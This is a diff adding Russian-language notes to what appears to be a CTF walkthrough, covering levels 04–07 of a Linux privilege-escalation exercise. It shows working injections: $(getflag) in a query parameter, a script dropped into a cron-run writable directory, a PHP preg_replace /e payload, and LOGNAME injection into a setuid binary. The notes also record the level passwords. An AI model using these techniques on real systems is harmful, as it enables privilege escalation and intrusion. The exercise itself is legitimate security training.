@@ -145,3 +145,132 @@ x(param("x"));
 в квери параметре если указать index.py?x=$(getflag), подставится нужная команда вместо x
 curl localhost:4747?x='$(getflag)'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+перехожу ко 5му уровню
+su level05 ne2searoevaevoem4ov4ar8ap
+
+# level05
+
+В терминале при переходе на уровень появляется сообщение, что пришло письмо (иногда не появляется).
+В переменной окружения MAIL путь к письму
+
+cat /var/mail/level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+*/2 * * * * синтаксис линукс планировщика. Для расшифровки:
+https://crontab.guru/
+ ||
+ \/
+“At every 2nd minute.”
+значит запускается скрипт с правами flag05
+
+cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+значит, надо положить в /opt/openarenaserver/ свой скрипт
+getfacl /opt/openarenaserver/ - покажет наличие возможности записывать в эту папку
+
+echo "getflag > /opt/openarenaserver/psswflag" > /opt/openarenaserver/run.sh
+
+cat /opt/openarenaserver/psswflag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+su level06 viuaaale9huek52boumoomioc
+
+# level06
+
+ls -la
+./level06
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+cat level06.php
+```php
+#!/usr/bin/php
+<?php
+function y($m) { 
+    $m = preg_replace("/\./", " x ", $m); 
+    $m = preg_replace("/@/", " y", $m); 
+    return $m; 
+}
+function x($y, $z) { 
+    $a = file_get_contents($y); 
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+    $a = preg_replace("/\[/", "(", $a); 
+    $a = preg_replace("/\]/", ")", $a); 
+    return $a; 
+}
+$r = x($argv[1], $argv[2]); 
+print $r;
+?>
+```
+
+
+о модификаторе е
+https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
+
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+
+вызывается функция "y(\"\\2\")", и применяется к строке а
+\2 - вторая скобочная группа в регулярных выражениях
+
+(\[x (.*)\]) - первая скобочная группа
+     (.*)    - вторая скобочная группа
+
+https://regexr.com/
+визуализирует регулярное выражение
+[x fsdg] подсветит, то есть что-то, что начинается "[x ", далее "." - это 1 любой символ, "*" - сколько угодно символов, далее "]". Значит, что будет вызвана функция у с fsdg.
+
+$r = x($argv[1], $argv[2]); х вызывается с агрументами
+function x($y, $z) { 
+    $a = file_get_contents($y); 
+file_get_contents - читает содержимое файла
+
+Создаю файл и передаю его в аргументы с содержимым:
+2 варианта:
+[x ${`getflag`}]
+[x {${system(getflag)}}]
+
+echo "This is the value of the var named by the return value of getName(): {${getName()}}"
+https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.simple
+
+в php `` отработает как функция system
+
+echo '[x {${system(getflag)}}]' > /tmp/myy
+где ${} позволят вставить значение exec(getflag), то есть exec(getflag) не текст будет, а вызовется функция. Это нужно, потому что здесь  двойные кавычки y(\"\\2\").
+
+./level06 /tmp/myy gdfgdfgh
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+su level07 wiok45aaoguiboiki2tuin6ub
+
+# level07
+
+ls -la
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
+
+ltrace ./level07 
+__libc_start_main(0x8048514, 1, 0xbffff6f4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                                 = 2007
+geteuid()                                                                 = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
+getenv("LOGNAME")                                                         = "level07"
+asprintf(0xbffff644, 0x8048688, 0xbfffff27, 0xb7e5ee55, 0xb7fed280)       = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                    = 0
++++ exited (status 0) +++
+
+export LOGNAME='$(getflag)'
+./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+su level08 fiumuikeil55xe9cu4dood66h
